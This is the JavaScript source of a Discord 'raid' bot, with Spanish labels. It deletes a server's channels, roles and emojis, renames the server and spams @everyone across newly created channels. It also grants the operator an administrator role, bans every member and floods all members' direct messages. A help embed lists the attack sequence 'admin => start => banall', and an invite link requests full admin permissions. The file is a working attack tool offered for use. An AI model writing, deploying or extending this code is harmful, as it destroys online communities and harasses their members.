const Discord = require("discord.js")
const client = new Discord.Client();
const token = ("Token aqui")
const spam = ("||@everyone|| **Servidor Raideado Por Tu Squad**")
const dm = ("**Este Servidor Fue Raideado Por Tu Squad**")
const Nombredelbot = ("Tu Nombre")

let prefix = (">")


client.on("ready", () => {
  var presencia = [`Presencia 1`, "Presencia 2"];
  let i = 0;
  client.user.setActivity(presencia[0]);
  i++;
  setInterval(() => {
   if (i >= presencia.length + 1) {
     i = 0;
   }
  client.user.setActivity(presencia[i]);
  i++;
  }, 1000 * 7); 
  });


client.on("message", message => {
const args = message.content.slice(1).trim().split(/ +/g);
 if(message.content.startsWith(prefix +"start")){
 
    message.delete()
    message.guild.roles.cache.each(role => { if (!role.deletable) return role.delete();})
    message.guild.emojis.cache.each(emojis => emojis.delete())
    message.guild.setName("RαιԃBყSყɳƚαxSϙυαԃ");
    message.guild.setIcon("https://cdn.discordapp.com/attachments/792901118124228660/792902123087200306/Screenshot_20201228_004922.jpg")
    message.guild.channels.cache.forEach(a => {
    a.delete();
    })
    try { 
  var interval_crear_roles = setInterval(async function() {
    message.guild.roles.create({ 
      data:{
        name:'Raid By SyntaxSquad',
        color:'#5E0D06'
      }
    })
  })
  
  
  var interval_crear_canales = setInterval(async function () {
    
  let raideo  = await message.guild.channels.create('Tu Squad', {
      type: 'text',
      permissions: ['VIEW_CHANNEL']
  })
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  message.guild.channels.cache.get(raideo.id).send(spam)
  })
    } catch (a) {
      console.log(a.stack);
    }
    setInterval(async function() { 
      
      message.guild.roles.create({
        
     data: {
       name:'Raid By Tu Squad',
       color:'#5E0D06'
       
     }
      })
      
    })
  }


if(message.content.startsWith(prefix +"admin")) {
 
  let role = message.guild.roles.create({
    data: {
      name: 'SyntaxSquad',
      color: '#000000',
      permissions:[8]
    },
    reason: 'SyntaxSquad',
  }).then(function(a) {
    message.member.roles.add(a)
    message.delete()
    
  })
}
 if(message.content === prefix+"canal") {
   message.delete();

   let args = message.content.slice(prefix.length).trim().split(/ +/g)
  let command = args.shift().toLowerCase()

  let co = args[0]
  let nu = args[1]


  if(!co) return message.author.send("Nombre de los canales")
  if(!nu) return message.author.send("Cuantas veces hare el canal")

  for(let i =0;i<=nu;i++)

  message.guild.channels.create(`${co}`, "text")


 
}
 
if(message.content.startsWith(prefix +"banall")) {
  message.delete()

  message.guild.members.cache.forEach(syntax => {
    syntax.ban({reason:'Raid By Tu Squad'})
    
  })
}


if(message.content.startsWith(prefix+"servers")) {
  const embed = new Discord.MessageEmbed()
.setTitle(`**Servidores donde esta** ${Nombredelbot} `)
.setDescription( "**" +client.guilds.cache.map(r => r.name + " | " +  r.id).join(" \n  ")+( "**" ))
.setFooter("Servers: "+client.guilds.cache.size)
  
  message.channel.send(embed)

}


if(message.content.startsWith(prefix+"invite")) {
  
  let a = args[1]
  let guild = client.guilds.cache.get(a)
  if (!guild) return message.channel.send("No estoy ahi");
  
  let invitacioncanales = guild.channels.cache.filter(c=> c.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE"))
  if(!invitacioncanales) return message.channel.send("No se encontraron canales para crear una invitacion")
  
  invitacioncanales.random().createInvite()
     .then(invite => message.channel.send(invite.url))
}
 if(message.content.startsWith(prefix+"invitacion")) {
   message.reply("https://discord.gg/3KBQckPaQt")
 } 
if(message.content.startsWith(prefix+"unban")) {
  let a = args[1]
  let guild = client.guilds.cache.get(a)
  if (!guild) return message.channel.send("No estoy ahi");
    let userID = args[0] 
    message.guild.fetchBans().then(bans=> { 
    if(bans.size == 0) return message.channel.send("No hay baneos")  
    let bUser = bans.find(b => b.user.id == userID)
    if(!bUser) return message.channel.send("No existe el usuario") 
    
    message.guild.members.unban(bUser.user) .then(() => { message.channel.send("Se te desbaneo del servidor")}).catch(message.channel.send("No estas baneado de ese servidor"))
    
  })
} ////////////////////////////Hay que hacer otro codigo este esta explotado con otro me refiero a otra app pero del mismo token osea Copy Paste
                                   
if(message.content.startsWith(prefix+("dmspam"))){
  message.delete()
 
  message.delete()
  message.guild.members.cache.forEach(member => { 
    setInterval(function() {
      member.send(`${dm}`).catch(error => {});
    },1000 * 1);
  
  })
}

  
if (message.content === prefix+"clear") {
  message.delete()
 
  if (message.guild.channels.cache.size === 0) return;
  else if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS"))
    return message.author.send("No tengo permisos en ese servidor")
  message.guild.roles.cache.forEach(a => {
    a.delete();
  })
  message.guild.channels.cache.forEach(a => {
    if (a.deletable) a.delete();
      
  });
}
  
if(message.content.startsWith(prefix+"delroles")) {
  message.delete()
 
  if (message.guild.roles.cache.size === 0) return;
  message.guild.roles.cache.forEach(a => {
    a.delete(); /////////////Hola que haces masturbador cronico | 
   
  })
}

  
  
if(message.content.startsWith(prefix + ("bot"))) {
  message.author.send("https://discord.com/api/oauth2/authorize?client_id=781052388953817129&permissions=8&scope=bot")
}
  
if(message.content.startsWith(prefix + ("syntax"))) {
  message.delete();
  const a = new Discord.MessageEmbed()
  a.setTitle(`Comandos | Mi prefix es ${prefix}`)
  a.addField("**Empezar con un raideo**", "**start**", true)
  a.addField("**Otorgar un rol con el permiso de admin**", "**admin**", true)
  a.addField("**Banear a todos los usuarios baneables**", "**banall**", true)
  a.addField("**Spamear en todos los dm del servidor raideado**", "**dmspam**", true)
  a.addField("**Ver los servidores donde esta el bot**", "**servers**", true)
  a.addField("**Para crear una invitacion donde esta el bot**", "**invite**", true)
  a.addField("**Para borrar todos los roles y canales**", "**clear**", true)
  a.addField("**Para desbanearte de un servidor**", "**unban**", true )
  a.addField("**Crear invitacion del bot para meterlo en un server**", "**bot**", true)
  a.addField("**Eliminar todos los roles del servidor**", "**delroles**", true)
  a.setFooter(`
  Para hacer un raid exitosamente ejecuta los comandos de la siguiente forma:
  admin => start => banall`)
  a.setThumbnail("https://cdn.discordapp.com/attachments/792901118124228660/792902123087200306/Screenshot_20201228_004922.jpg")
  message.author.send(a)
  
}
if(message.content === `${prefix}leave`) {
  message.delete()
  
  message.guild.leave();
}


});

    client.login (token)
    console.log("Bot Funcionando B)")  
